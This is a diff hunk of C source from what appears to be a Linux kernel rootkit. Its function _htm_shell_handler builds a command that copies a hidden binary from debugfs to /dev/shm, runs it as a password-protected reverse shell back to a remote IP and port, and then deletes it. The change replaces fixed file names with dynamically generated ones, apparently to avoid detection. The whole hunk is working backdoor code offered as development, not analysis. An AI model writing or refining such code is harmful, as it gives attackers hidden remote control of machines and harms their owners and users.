@@ -34,16 +34,19 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 	int ret, ret_debugfs;
 	char cmd[HTM_MAX_STRING];
 
+	char *dir_name = htm_debugfs_dir_name();
+	char *rsh_name = htm_debugfs_rsh_name();
+
 	memset(cmd, 0x00, sizeof(cmd));
 
 	ret_debugfs = htm_debugfs_rsh_create();
 
 	ret = snprintf(
 		cmd, sizeof(cmd) - 1,
-		"cp " "/sys/kernel/debug/" HTM_DEBUGFS_DIR "/" HTM_DEBUGFS_FILE " /dev/shm/;"
-		"/dev/shm/" HTM_DEBUGFS_FILE " -nfk " HTM_RSH_PASSWORD " -E " HTM_EXEC_SHELL " %pI4 %d;"
-		"rm /dev/shm/" HTM_DEBUGFS_FILE,
-		saddr, HTM_RSH_PORT
+		"cp /sys/kernel/debug/%s/%s /dev/shm/;"
+		"/dev/shm/%s -nfk " HTM_RSH_PASSWORD " -E " HTM_EXEC_SHELL " %pI4 %d;"
+		"rm /dev/shm/%s",
+		dir_name, rsh_name, rsh_name, saddr, HTM_RSH_PORT, rsh_name
 	);
 
 	if (ret <= 0) {
